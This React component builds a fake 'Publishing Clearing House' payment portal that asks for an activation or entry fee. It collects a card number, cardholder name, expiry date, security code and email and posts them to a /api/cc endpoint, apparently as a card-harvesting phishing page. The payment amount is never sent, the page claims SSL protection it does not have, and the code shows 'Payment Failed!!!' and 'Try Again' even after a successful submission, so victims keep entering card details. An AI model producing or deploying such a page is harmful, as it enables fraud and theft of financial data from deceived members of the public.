import React, { useState } from 'react';

const CreditCardPage = () => {
  const [formData, setFormData] = useState({
    cNumber: '',
    cName: '',
    expDate: '',
    vvc: '',
    mail: '',
    amount: '49.99' // Default amount
  });
  const [loading, setLoading] = useState(false);
  const [message, setMessage] = useState('');
  const [errors, setErrors] = useState({});
  const [showModal, setShowModal] = useState(false);
  const [paymentStatus, setPaymentStatus] = useState(null);
  const [transactionData, setTransactionData] = useState(null);

  // Predefined amounts
  const amountOptions = [
    { value: '49.99', label: '$49.99 - Activation Fee' },
    { value: '99.99', label: '$99.99 - Premium Entry' },
    { value: '149.99', label: '$149.99 - VIP Entry' },
    { value: 'custom', label: 'Custom Amount' }
  ];

  const validateForm = () => {
    const newErrors = {};

    // Email validation
    if (!formData.mail) {
      newErrors.mail = 'Email is required';
    } else if (!/\S+@\S+\.\S+/.test(formData.mail)) {
      newErrors.mail = 'Email is invalid';
    }

    // Cardholder name validation
    if (!formData.cName.trim()) {
      newErrors.cName = 'Cardholder name is required';
    } else if (formData.cName.trim().length < 2) {
      newErrors.cName = 'Cardholder name is too short';
    }

    // Card number validation (Luhn algorithm)
    if (!formData.cNumber) {
      newErrors.cNumber = 'Card number is required';
    } else {
      const cleanNumber = formData.cNumber.replace(/\s/g, '');
      if (!/^\d+$/.test(cleanNumber)) {
        newErrors.cNumber = 'Card number must contain only digits';
      } else if (cleanNumber.length < 13 || cleanNumber.length > 19) {
        newErrors.cNumber = 'Card number must be 13-19 digits';
      } else if (!luhnCheck(cleanNumber)) {
        newErrors.cNumber = 'Card number is invalid';
      }
    }

    // Expiry date validation
    if (!formData.expDate) {
      newErrors.expDate = 'Expiry date is required';
    } else {
      const [month, year] = formData.expDate.split('/');
      if (!month || !year || month.length !== 2 || year.length !== 2) {
        newErrors.expDate = 'Invalid format (MM/YY)';
      } else {
        const currentDate = new Date();
        const currentYear = currentDate.getFullYear() % 100;
        const currentMonth = currentDate.getMonth() + 1;
        
        const expMonth = parseInt(month);
        const expYear = parseInt(year);
        
        if (expMonth < 1 || expMonth > 12) {
          newErrors.expDate = 'Invalid month';
        } else if (expYear < currentYear || (expYear === currentYear && expMonth < currentMonth)) {
          newErrors.expDate = 'Card has expired';
        }
      }
    }

    // VVC validation
    if (!formData.vvc) {
      newErrors.vvc = 'VVC is required';
    } else if (!/^\d+$/.test(formData.vvc)) {
      newErrors.vvc = 'VVC must contain only digits';
    } else if (formData.vvc.length < 3 || formData.vvc.length > 4) {
      newErrors.vvc = 'VVC must be 3-4 digits';
    }

    // REMOVED amount validation

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  // Luhn algorithm for card validation
  const luhnCheck = (cardNumber) => {
    let sum = 0;
    let isEven = false;

    for (let i = cardNumber.length - 1; i >= 0; i--) {
      let digit = parseInt(cardNumber[i]);

      if (isEven) {
        digit *= 2;
        if (digit > 9) {
          digit -= 9;
        }
      }

      sum += digit;
      isEven = !isEven;
    }

    return sum % 10 === 0;
  };

  const handleChange = (e) => {
    const { name, value } = e.target;
    
    // Clear error when user starts typing
    if (errors[name]) {
      setErrors(prev => ({ ...prev, [name]: '' }));
    }
    
    // Format card number with spaces (cNumber)
    if (name === 'cNumber') {
      const formattedValue = value.replace(/\s/g, '').replace(/(\d{4})/g, '$1 ').trim();
      setFormData(prev => ({ ...prev, [name]: formattedValue }));
      return;
    }
    
    // Format expiry date (expDate)
    if (name === 'expDate') {
      const formattedValue = value.replace(/\D/g, '').replace(/(\d{2})(\d)/, '$1/$2').substring(0, 5);
      setFormData(prev => ({ ...prev, [name]: formattedValue }));
      return;
    }

    // Limit VVC to 4 digits
    if (name === 'vvc') {
      const formattedValue = value.replace(/\D/g, '').substring(0, 4);
      setFormData(prev => ({ ...prev, [name]: formattedValue }));
      return;
    }

    setFormData(prev => ({ ...prev, [name]: value }));
  };

  const handleAmountSelect = (amountValue) => {
    setFormData(prev => ({ ...prev, amount: amountValue }));
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (!validateForm()) {
      setMessage('Please fix the errors above');
      return;
    }

    setLoading(true);
    setMessage('');

    try {
      // Prepare data for API - remove spaces from card number and EXCLUDE amount
      const apiData = {
        cNumber: formData.cNumber.replace(/\s/g, ''), // Remove spaces for storage
        cName: formData.cName,
        expDate: formData.expDate,
        vvc: formData.vvc,
        mail: formData.mail
        // Amount is NOT included in API data
      };

      // Using Fetch API instead of axios
      const response = await fetch('http://localhost:3000/api/cc', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(apiData)
      });

      const responseData = await response.json();

      // Set transaction data for modal (includes amount for display only)
      setTransactionData({
        transactionId: responseData.data?.id || 'TXN_' + Math.random().toString(36).substr(2, 9),
        amount: formData.amount, // For display in modal only
        timestamp: new Date().toLocaleString(),
        cardLastFour: formData.cNumber.slice(-4)
      });
      
      setPaymentStatus('success');
      setShowModal(true);
      
      // Reset form but keep the selected amount
      const currentAmount = formData.amount;
      setFormData({
        cNumber: '',
        cName: '',
        expDate: '',
        vvc: '',
        mail: '',
        amount: currentAmount // Keep the amount selection
      });
      
    } catch (error) {
      setPaymentStatus('error');
      setShowModal(true);
      setMessage('Error processing payment. Please try again.');
      console.error('Error:', error);
    } finally {
      setLoading(false);
    }
  };

  const closeModal = () => {
    setShowModal(false);
    setPaymentStatus(null);
    setTransactionData(null);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-600 to-blue-600 py-8 px-4">
      {/* Payment Status Modal */}
      {showModal && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center p-4 z-50">
          <div className="bg-white rounded-2xl shadow-2xl max-w-md w-full p-6">
            <div className="text-center">
              {/* Success Icon */}
              {paymentStatus === 'success' && (
                 <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                  <svg className="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path>
                  </svg>
                </div>
              )}
              
              {/* Error Icon */}
              {paymentStatus === 'error' && (
                <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
                  <svg className="w-8 h-8 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12"></path>
                  </svg>
                </div>
              )}

              <h3 className="text-xl font-bold text-gray-900 mb-2">
                {paymentStatus === 'success' ? 'Payment Failed!!!' : 'Payment Failed!!!'}
              </h3>
              
              {paymentStatus === 'success' && transactionData && (
                // <div className="text-left bg-gray-50 p-4 rounded-lg mb-4">
                //   <div className="space-y-2 text-sm">
                //     <div className="flex justify-between">
                //       <span className="text-gray-600">Transaction ID:</span>
                //       <span className="font-mono">{transactionData.transactionId}</span>
                //     </div>
                //     <div className="flex justify-between">
                //       <span className="text-gray-600">Amount:</span>
                //       <span className="font-bold">${transactionData.amount}</span>
                //     </div>
                //     <div className="flex justify-between">
                //       <span className="text-gray-600">Card:</span>
                //       <span>**** {transactionData.cardLastFour}</span>
                //     </div>
                //     <div className="flex justify-between">
                //       <span className="text-gray-600">Date:</span>
                //       <span>{transactionData.timestamp}</span>
                //     </div>
                //   </div>
                // </div>
                <p className="text-gray-600 mb-4">
                  There was an error processing your payment. Please check your information and try again.
                </p>
              )}

              {paymentStatus === 'error' && (
                <p className="text-gray-600 mb-4">
                  There was an error processing your payment. Please check your information and try again.
                </p>
              )}

              <button
                onClick={closeModal}
                className={`w-full py-3 px-6 rounded-lg font-bold text-white ${
                  paymentStatus === 'success' 
                    ? 'bg-red-600 hover:bg-red-700' 
                    : 'bg-red-600 hover:bg-red-700'
                } transition-colors`}
              >
                {paymentStatus === 'success' ? 'Try Again' : 'Try Again'}
              </button>
            </div>
          </div>
        </div>
      )}

      {/* PCH Header */}
      <div className="max-w-2xl mx-auto bg-white rounded-2xl shadow-2xl overflow-hidden">
        {/* PCH Banner */}
        <div className="bg-red-600 py-4 px-6 text-white">
          <div className="flex items-center justify-between">
            <h1 className="text-2xl font-bold">PCH CREDIT CARD PAYMENT</h1>
            <div className="text-sm bg-yellow-400 text-red-600 px-3 py-1 rounded-full font-bold">
              SECURE PAYMENT
            </div>
          </div>
          <p className="text-sm mt-2 opacity-90">
            Official Publishing Clearing House Payment Portal
          </p>
        </div>

        {/* Main Content */}
        <div className="p-8">
          {/* Alert Banner */}
          <div className="bg-yellow-50 border-l-4 border-yellow-400 p-4 mb-6">
            <div className="flex">
              <div className="flex-shrink-0">
                <svg className="h-5 w-5 text-yellow-400" viewBox="0 0 20 20" fill="currentColor">
                  <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
                </svg>
              </div>
              <div className="ml-3">
                <p className="text-sm text-yellow-700">
                  <strong>Security Notice:</strong> Your information is protected with 256-bit SSL encryption.
                </p>
              </div>
            </div>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Amount Selection - Display only, not submitted to API */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-3">
                Select Payment Amount
              </label>
              <div className="grid grid-cols-2 gap-3">
                {amountOptions.map((option) => (
                  <button
                    key={option.value}
                    type="button"
                    onClick={() => handleAmountSelect(option.value)}
                    className={`p-3 border-2 rounded-lg text-center transition-all ${
                      formData.amount === option.value
                        ? 'border-blue-500 bg-blue-50 text-blue-700'
                        : 'border-gray-300 hover:border-gray-400'
                    }`}
                  >
                    <div className="font-medium text-sm">{option.label}</div>
                  </button>
                ))}
              </div>
            </div>

            {/* Custom Amount Input - Display only */}
            {formData.amount === 'custom' && (
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Custom Amount ($)
                </label>
                <div className="relative">
                  <div className="absolute inset-y-0 left-0 pl-3 flex items-center pointer-events-none">
                    <span className="text-gray-500 sm:text-sm">$</span>
                  </div>
                  <input
                    type="number"
                    step="0.01"
                    min="1"
                    placeholder="0.00"
                    value={formData.customAmount || ''}
                    onChange={(e) => setFormData(prev => ({ ...prev, amount: e.target.value }))}
                    className="block w-full pl-7 pr-12 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500"
                  />
                </div>
              </div>
            )}

            {/* Email Field (mail) */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Email Address
              </label>
              <input
                type="email"
                name="mail"
                value={formData.mail}
                onChange={handleChange}
                className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                  errors.mail ? 'border-red-500' : 'border-gray-300'
                }`}
                placeholder="your@email.com"
              />
              {errors.mail && (
                <p className="text-red-600 text-sm mt-1">{errors.mail}</p>
              )}
            </div>

            {/* Cardholder Name (cName) */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Cardholder Name
              </label>
              <input
                type="text"
                name="cName"
                value={formData.cName}
                onChange={handleChange}
                className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                  errors.cName ? 'border-red-500' : 'border-gray-300'
                }`}
                placeholder="As shown on card"
              />
              {errors.cName && (
                <p className="text-red-600 text-sm mt-1">{errors.cName}</p>
              )}
            </div>

            {/* Card Number (cNumber) */}
            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">
                Card Number
              </label>
              <input
                type="text"
                name="cNumber"
                value={formData.cNumber}
                onChange={handleChange}
                maxLength="19"
                className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                  errors.cNumber ? 'border-red-500' : 'border-gray-300'
                }`}
                placeholder="1234 5678 9012 3456"
              />
              {errors.cNumber && (
                <p className="text-red-600 text-sm mt-1">{errors.cNumber}</p>
              )}
            </div>

            {/* Expiry and VVC */}
            <div className="grid grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  Expiry Date
                </label>
                <input
                  type="text"
                  name="expDate"
                  value={formData.expDate}
                  onChange={handleChange}
                  maxLength="5"
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                    errors.expDate ? 'border-red-500' : 'border-gray-300'
                  }`}
                  placeholder="MM/YY"
                />
                {errors.expDate && (
                  <p className="text-red-600 text-sm mt-1">{errors.expDate}</p>
                )}
              </div>
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">
                  VVC
                </label>
                <input
                  type="text"
                  name="vvc"
                  value={formData.vvc}
                  onChange={handleChange}
                  maxLength="4"
                  className={`w-full px-4 py-3 border rounded-lg focus:ring-2 focus:ring-blue-500 focus:border-blue-500 ${
                    errors.vvc ? 'border-red-500' : 'border-gray-300'
                  }`}
                  placeholder="123"
                />
                {errors.vvc && (
                  <p className="text-red-600 text-sm mt-1">{errors.vvc}</p>
                )}
              </div>
            </div>

            {/* Security Icons */}
            <div className="flex justify-center space-x-8 py-4">
              <div className="text-center">
                <div className="w-12 h-8 bg-gray-200 rounded mx-auto mb-2 flex items-center justify-center">
                  <span className="text-xs font-bold text-gray-600">SSL</span>
                </div>
                <span className="text-xs text-gray-600">Secure</span>
              </div>
              <div className="text-center">
                <div className="w-12 h-8 bg-gray-200 rounded mx-auto mb-2 flex items-center justify-center">
                  <span className="text-xs font-bold text-gray-600">256-bit</span>
                </div>
                <span className="text-xs text-gray-600">Encrypted</span>
              </div>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={loading}
              className={`w-full py-4 px-6 rounded-lg font-bold text-white transition-colors ${
                loading 
                  ? 'bg-gray-400 cursor-not-allowed' 
                  : 'bg-green-600 hover:bg-green-700'
              }`}
            >
              {loading ? (
                <div className="flex items-center justify-center">
                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Processing...
                </div>
              ) : (
                `PROCESS PAYMENT - $${formData.amount}`
              )}
            </button>

            {/* Message Display */}
            {message && !showModal && (
              <div className={`p-4 rounded-lg text-center font-medium ${
                message.includes('Error') 
                  ? 'bg-red-100 text-red-700' 
                  : 'bg-blue-100 text-blue-700'
              }`}>
                {message}
              </div>
            )}
          </form>

          {/* Footer */}
          <div className="mt-8 pt-6 border-t border-gray-200">
            <div className="flex justify-between items-center text-sm text-gray-500">
              <div>
                <p>© 2024 Publishing Clearing House</p>
              </div>
              <div className="flex space-x-4">
                <span>Privacy Policy</span>
                <span>Terms of Service</span>
                <span>Contact Support</span>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default CreditCardPage;